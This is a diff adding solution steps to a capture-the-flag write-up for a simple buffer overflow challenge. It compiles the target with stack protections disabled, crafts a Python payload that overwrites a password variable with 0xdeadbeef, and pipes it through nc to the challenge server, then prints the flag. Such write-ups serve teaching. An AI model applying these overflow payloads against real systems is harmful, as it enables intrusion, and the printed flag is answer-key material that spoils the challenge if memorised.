@@ -8,7 +8,8 @@ The sourcecode of the executable is given in the challenge, (buffer_overflow1.c)
 # Solution
 
 1. Analyzing code
-2. crafting our buffer overflow input
+2. Compiling the code
+3. crafting our buffer overflow input
 
 ## 1. Analyzing code
 Looking at the sourcecode we notice that this is an easy buffer overflow example.
@@ -41,3 +42,42 @@ else {
 
 we also notice that in the `read` function it reads `0x100` bytes which is `256` bytes, however the variable `your_name` is only 100 bytes long. This means that the `read` function can lead to a buffer overflow vulnerability.
 
+## 2. compiling the code
+`gcc buffer_overflow1.c -o buffer_overflow1.exe -fno-stack-protector -z execstack -no-pie`
+we use `-fno-stack-protector -z execstack -no-pie` to ensure no stack protection is running so our exploit can run.
+
+## 3. crafting our buffer overflow input
+To solve this challenge we need to change the value of the password variable to `0xdeadbeef` to do this we need to use the `read` function to overwrite the stack space of the variable `password`.
+
+The stack has the variable `password` with length 8 bytes on top of it (remember: stack addresses are flipped) the `your_name` variable with length of 100 bytes. So we need to enter 100 bytes then our new password value of `0xdeadbeef`.
+
+```
++++++++++++++++++++++++++++++++++
++           +                   +
++           +                   +
++    100    +    your_name      +
++   bytes   +                   +
++           +                   +
++           +                   +
++++++++++++++++++++++++++++++++++
++    8      +    password       +
++   bytes   +                   +
++++++++++++++++++++++++++++++++++
+```
+
+>Note that: the variable `passowrd` is in hex and we read it in Little Indian from right to left.
+
+
+To craft our malformed input, we use python as follows:
+`print('A'*100+'\xef\xbe\xad\xde')`
+`>>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+`
+>note the special char at the end representing the hex value `0xdeadbeef`
+
+By entering this value into the program, it gives the FLAG.
+
+# One line command:
+`python -c "print('A'*100+'\xef\xbe\xad\xde')" | nc pwnable.hackable.ca 9993`
+
+#FLAGL:
+FLAG{0v3rfl0w5_ar3_fun}
